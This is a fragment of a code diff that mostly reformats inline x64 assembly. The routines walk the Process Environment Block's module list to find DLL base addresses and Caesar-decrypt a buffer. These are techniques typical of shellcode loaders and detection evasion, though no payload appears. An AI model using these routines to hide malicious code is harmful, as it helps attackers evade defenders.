+    "mov rax, [rax+0x18] \n"  // _PEB_LDR_DATA
+    "mov rax, [rax+0x20] \n"  // InMemoryOrderModuleList - First Entry (probably the host PE File)
+    "ret                 \n"
 
-"getNextEntry: \n"  // RAX, RCX
-    "mov rax, [rcx] \n"
-    "cmp rdx, [rax] \n"             // Are we back at the same entry in the list?
-    "jne notTheLast \n"
-    "xor rax, rax \n"
-"notTheLast: \n"
-    "ret \n"
+"getNextEntry:           \n"  // RAX, RCX
+    "mov rax, [rcx]      \n"
+    "cmp rdx, [rax]      \n"  // Are we back at the same entry in the list?
+    "jne notTheLast      \n"
+    "xor rax, rax        \n"
+"notTheLast:             \n"
+    "ret                 \n"
 
-"getDllBaseFromEntry: \n"  // RAX,RCX
+"getDllBaseFromEntry:    \n"  // RAX,RCX
     "mov rax, [rcx+0x20] \n"
-    "ret \n"
+    "ret                 \n"
 
 "basicCaesar_Decrypt:\n" // RAX,RCX,RDX,RSI,RDI
-    "push rdi \n"
-    "push rsi \n"
-    "mov rsi, rdx\n"
-    "xor rax, rax\n"
-    "add al, r8b\n"
-"bcdLoop:\n"
-    "sub [rsi], al\n"
-    "inc rsi\n"
-    "dec cl\n"
-    "test cl,cl\n"
-    "jnz bcdLoop\n"
-    "pop rsi \n"
-    "pop rdi \n"
-    "ret\n"
+    "push rdi      \n"
+    "push rsi      \n"
+    "mov rsi, rdx  \n"
+    "xor rax, rax  \n"
+    "add al, r8b   \n"
+"bcdLoop:          \n"
+    "sub [rsi], al \n"
+    "inc rsi       \n"
+    "dec cl        \n"
+    "test cl,cl    \n"
+    "jnz bcdLoop   \n"
+    "pop rsi       \n"
+    "pop rdi       \n"
+    "ret           \n"
+
+
+
 );
